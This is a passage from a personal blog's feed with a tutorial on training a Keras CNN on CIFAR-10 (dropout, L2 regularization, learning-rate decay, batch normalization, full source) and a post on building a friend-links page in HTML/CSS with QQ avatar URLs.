class="line">                                                                 </span><br><span class="line"> max_pooling2d_2 (MaxPooling  (None, 4, 4, 256)        0         </span><br><span class="line"> 2D)                                                             </span><br><span class="line">                                                                 </span><br><span class="line"> flatten (Flatten)           (None, 4096)              0         </span><br><span class="line">                                                                 </span><br><span class="line"> dense (Dense)               (None, 256)               1048832   </span><br><span class="line">                                                                 </span><br><span class="line"> dense_1 (Dense)             (None, 10)                2570      </span><br><span class="line">                                                                 </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Total params: 1,422,218</span><br><span class="line">Trainable params: 1,422,218</span><br><span class="line">Non-trainable params: 0</span><br><span class="line">_________________________________________________________________</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>However, after a few epochs, I found the accuracy too low to convince me that I have reached CNNâ€™s full potential, which was only around 70~75%, and was heavily overfitted since the training set accuracy is around 90%.</p><h3 id="Training-Tricks"><a href="#Training-Tricks" class="headerlink" title="Training Tricks"></a>Training Tricks</h3><p>Actually, even though youâ€™ve come up with a fantastic structure, or just copied a successful classic structure from Internet, without some tricky training approaches, you can barely make the network works well.</p><h4 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h4><p>Dropout is a great way to avoid overfitting. Iâ€™ve implemented this method in my FCNN project and found it useful, so Iâ€™d recommend it also to CNN. We can add dropout layer into convolutional layers or FC layers, the dropout rate should be between 0.1 and 0.5. In detail, you should make the network receive all input information or most of it, so the dropout rate of the input layer should be like 0.1 or 0, then feel free about the dropout rate in hidden layers.</p><p>The reason why dropout helps, in my personal belief, is that randomly disabling neurons makes your single network more likely to be made up with tons of smaller networks, which improves robustness of your model evidently.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br></pre></td></tr></table></figure><p>The code above means it will disable 40% neurons in the previous layer randomly.</p><p>In CNN, itâ€™s said adding dropout layer before or after pooling layer are both OK. I personally think adding a dropout layer after a pooling layer maximizes the effect of a dropout layer, so Iâ€™d prefer this method in most cases.</p><p>Adding a dropout layer will also make your validation accuracy higher than your training accuracy at the beginning. The difference between validation accuracy and training accuracy should be smaller and smaller as model learns.</p><h4 id="Regularization"><a href="#Regularization" class="headerlink" title="Regularization"></a>Regularization</h4><p>Doing regularization to weights and biases can also limit the level of overfitting because itâ€™s minimizing the complexity of your model. This can be done by setting <code>kernel_regularizer</code> to some <code>regularizers</code> when creating a layer. The regularization parameter, or <code>weight_decay</code>, is usually set to <code>1e-4</code>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(layers.Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_regularizer=regularizers.l2(<span class="number">1e-4</span>)))</span><br></pre></td></tr></table></figure><h4 id="Learning-Rate-Decay"><a href="#Learning-Rate-Decay" class="headerlink" title="Learning Rate Decay"></a>Learning Rate Decay</h4><p>When weâ€™re training the model, weâ€™re expecting the model to learn more â€˜carefullyâ€™ while itâ€™s getting more accurate. This demand leads us to learning rate decay.</p><p>Firstly, we can do a rather large decay to change the stage of training manually. For example, we can start the training with <code>learning_rate=0.002</code> for 10 epochs, and reduce the learning rate to 0.001 manually for another 10 epochs, by doing which, we can make our model to learn faster and more accurate at the same time.</p><p>Secondly, we can do very tiny decay in every stage of training. For example, when starting with <code>learning_rate=0.002</code>, we can reduce learning rate a bit after every epoch ,usually 1e-6, which also helps. To implement this method, just set <code>decay</code> parameter when initializing your optimizer.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optim = keras.optimizers.Adam(learning_rate=<span class="number">0.0003</span>, decay=<span class="number">1e-6</span>)</span><br></pre></td></tr></table></figure><h4 id="Batch-Normalization"><a href="#Batch-Normalization" class="headerlink" title="Batch Normalization"></a>Batch Normalization</h4><p>Before feeding data to the model, weâ€™d like to preprocess the data to make it close to Gaussian distribution to make the â€œlandscapeâ€ of loss function smoother, in extreme cases, a model may unable to be trained or stay a low accuracy if normalization of input data is not applied. Since we can use this normalization in the input layer, we can also apply this method to hidden layers. We can collect the output of a hidden layer and make it Gaussian distribution. According to researches, doing batch normalization before and after activation are usually both OK. But weâ€™d like to do it before activation when using sigmoid as activation function because sigmoid is happy to take input close to 0, from which we can get rather big gradient. So itâ€™s wise to make your decision after considering the actual conditions, features of your model, and the underlying principles of the actual processes.</p><p>When testing the model, it would use the delta and sigma at training stage to process the testing data.</p><p>I forgot to implement this kind of layers at first, and got accuracy to 84.46%. After implementing batch normalization layers, the accuracy increased by 1.5%, which is an evident improvement at such accuracy. So batch normalization is really a simple and effective way to improve your network.</p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Training a ANN is very similar to alchemy. You need to tweak your network hundred times and try every little trick including but not limited to what I mentioned above to improve it. So you need enough patience and knowledge to become a really powerful AI alchemist.</p><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>After implemented all tricks to prevent overfitting and normal optimizations such as input standardization, mini-batch, validation dataset, etc. I finally made the testing accuracy 86.03%, which is enough for me.</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <ul><li><p><strong>Importing</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> layers</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> regularizers</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br></pre></td></tr></table></figure></li><li><p><strong>Preprocess</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dataset = keras.datasets.cifar10</span><br><span class="line">(data_images, train_labels), (test_images, test_labels) = dataset.load_data()</span><br><span class="line"></span><br><span class="line">class_names = [<span class="string">&#x27;airplane&#x27;</span>, <span class="string">&#x27;automobile&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;deer&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;frog&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;ship&#x27;</span>, <span class="string">&#x27;truck&#x27;</span>]</span><br><span class="line">dataset_size = <span class="built_in">len</span>(data_images)</span><br><span class="line">train_images, test_images = data_images / <span class="number">255.0</span>, test_images / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">mean = np.mean(train_images, axis=<span class="built_in">tuple</span>(<span class="built_in">range</span>(train_images.ndim-<span class="number">1</span>)))</span><br><span class="line">std = np.std(train_images, axis=<span class="built_in">tuple</span>(<span class="built_in">range</span>(train_images.ndim-<span class="number">1</span>)))</span><br><span class="line">train_images = (train_images - mean) / std</span><br><span class="line">test_images = (test_images - mean) / std</span><br><span class="line"></span><br><span class="line">test_labels = np.squeeze(np.array(tf.one_hot(test_labels, <span class="number">10</span>)))</span><br><span class="line">train_labels = np.squeeze(np.array(tf.one_hot(train_labels, <span class="number">10</span>)))</span><br><span class="line"></span><br><span class="line">valid_images = train_images[-<span class="number">1000</span>:]</span><br><span class="line">train_images = train_images[:-<span class="number">1000</span>]</span><br><span class="line">valid_labels = train_labels[-<span class="number">1000</span>:]</span><br><span class="line">train_labels = train_labels[:-<span class="number">1000</span>]</span><br></pre></td></tr></table></figure></li><li><p><strong>Modeling</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">weight_decay = <span class="number">1e-4</span></span><br><span class="line"></span><br><span class="line">model = keras.models.Sequential()</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, input_shape=(<span class="number">32</span>, <span class="number">32</span>, <span class="number">3</span>),</span><br><span class="line">                        kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.1</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>,</span><br><span class="line">          kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">256</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>,</span><br><span class="line">          kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Flatten())</span><br><span class="line"></span><br><span class="line">model.add(layers.Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>, kernel_regularizer=regularizers.l2(weight_decay)))</span><br></pre></td></tr></table></figure></li><li><p><strong>Training</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">64</span></span><br><span class="line">loss = keras.losses.CategoricalCrossentropy()</span><br><span class="line">metrics = [<span class="string">&quot;accuracy&quot;</span>]</span><br><span class="line">history = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Train</span>(<span class="params">lr, epochs</span>):</span></span><br><span class="line">    optim = keras.optimizers.Adam(learning_rate=lr, decay=<span class="number">1e-6</span>)</span><br><span class="line">    model.<span class="built_in">compile</span>(optimizer=optim, loss=loss, metrics=metrics)</span><br><span class="line">    history.append(model.fit(train_images, train_labels, batch_size=batch_size, epochs=epochs,</span><br><span class="line">                             verbose=<span class="number">1</span>, validation_data=(valid_images, valid_labels),</span><br><span class="line">                             validation_batch_size=batch_size))</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.001</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN0&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0005</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN1&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0003</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN2&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0002</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN3&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul>    </div></div><h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><p><img src="/images/CNN_loss_rec.png"></p><center><small>Accuracy Figure</small></center><p><img src="/images/CNN_acc_rec.png"></p><center><small>Loss Figure</small></center><p>We can see that when changing to a smaller learning rate, the loss drops rapidly (Look at 10, 20, 30 epochs in the loss figure). Which proves that learning rate should match the stage of the model when training.</p><p>Finally, the most å–œé—»ä¹è§ (interesting and funny) part: Error prediction reviewing. Iâ€™ve labeled these data by <code>prediction / correct label</code></p><p><img src="/images/CNN_Wrong_Predictions.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;I roughly learnt CNN recently and was about to code one just like the FCNN I coded before. However this may be too costly to time, so Iâ€™ll use TensorFlow in this case and learn more about TF conveniently.&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://kyriota.github.io/categories/AI/"/>
    
    
  </entry>
  
  <entry>
    <title>Friend Links Setup</title>
    <link href="https://kyriota.github.io/2022/06/03/FriendLinksSetup/"/>
    <id>https://kyriota.github.io/2022/06/03/FriendLinksSetup/</id>
    <published>2022-06-03T08:52:30.000Z</published>
    <updated>2022-06-03T09:15:09.383Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å‹é“¾Pageçš„Setupè¿‡ç¨‹ï¼Œéå¸¸æ— è„‘ï¼Œæ¬ç –å°±å®Œäº†ï¼Œæ„Ÿè°¢å‰è¾ˆçš„ç»éªŒ</p><span id="more"></span><h1 id="Friend-Links-Setup"><a href="#Friend-Links-Setup" class="headerlink" title="Friend Links Setup"></a>Friend Links Setup</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>ä»£ç æ¥è‡ª<a href="https://finisky.github.io/simplestblogroll/">è¿™ç¯‡åšå®¢</a></p><p>å…³äºè·å–QQå¤´åƒçš„<a href="https://zhuanlan.zhihu.com/p/415485011">çŸ¥ä¹ä¸“æ </a></p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        CSS Source    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post-body&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;links&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">         .links-content&#123;</span><br><span class="line"><span class="css">         <span class="attribute">margin-top</span>:<span class="number">1rem</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.link-navigation</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">         <span class="attribute">clear</span>: both;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card &#123;</span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">45%</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">transition-duration</span>: <span class="number">0.15s</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">display</span>:flex;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:nth-child</span>(odd) &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">float</span>: left;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:nth-child</span>(even) &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">float</span>: right;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span></span><br><span class="line"><span class="css">         <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">6px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.12</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.04</span>);</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">border</span>:none;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .ava &#123;</span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">3rem</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">height</span>: <span class="number">3rem</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin</span>:<span class="number">0</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin-right</span>: <span class="number">1em</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">border-radius</span>:<span class="number">4px</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .card-header &#123;</span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="css">         <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-class">.card-header</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>: normal;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>: <span class="number">#2bbc8a</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">         <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-class">.card-header</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>: <span class="number">#d480aa</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .card-header .info &#123;</span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>:normal;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>:<span class="number">#a3a3a3</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-size</span>:<span class="number">14px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">min-width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">         <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line">         &#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;links-content&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;link-navigation&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;ava&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://q.qlogo.cn/g?b=qq&amp;k=7PD14jYzQNoQ0KvkgCT3Xw&amp;s=640&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://blog.woooo.tech/&quot;</span>&gt;</span>Reverier<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>XDSEC2019[Reverseã€å¼€å‘]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;ava&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://q.qlogo.cn/g?b=qq&amp;k=UDUVtLNg8WvYmkaibG4wtIg&amp;s=640&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://d33b4t0.com/&quot;</span>&gt;</span>Deebato<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>XDSEC2020[Crypto]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>    </div></div><p>è·å–Keyï¼š<a href="https://ptlogin2.qq.com/getface?&amp;imgtype=1&amp;uin=123456">https://ptlogin2.qq.com/getface?&amp;imgtype=1&amp;uin=123456</a></p><p>é€šè¿‡Keyè·å–å¤´åƒï¼š<a href="https://q.qlogo.cn/g?b=qq&amp;k=xyOnRe5ML3Aw96iaaQ1hh6w&amp;s=640">https://q.qlogo.cn/g?b=qq&amp;k=xyOnRe5ML3Aw96iaaQ1hh6w&amp;s=640</a></p><p>é€šè¿‡QQå·è·å–å¤´åƒï¼š<a href="https://q.qlogo.cn/g?b=qq&amp;nk=123456&amp;s=640">https://q.qlogo.cn/g?b=qq&amp;nk=123456&amp;s=640</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€ä¸‹å‹é“¾Pageçš„Setupè¿‡ç¨‹ï¼Œéå¸¸æ— è„‘ï¼Œæ¬ç –å°±å®Œäº†ï¼Œæ„Ÿè°¢å‰è¾ˆçš„ç»éªŒ&lt;/p&gt;</summary>
    
    
    
    <category term="Other" scheme="https://kyriota.github.io/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§</title>
    <link href="https://kyriota.github.io/2022/05/27/%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E5%89%8D%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/"/>
    <id>https://kyriota.github.io/2022/05/27/%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E5%89%8D%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/</id>
    <published>2022-05-27T11:42:20.000Z</published>
    <updated>2022-05-27T12:45:12.021Z</updated>
    
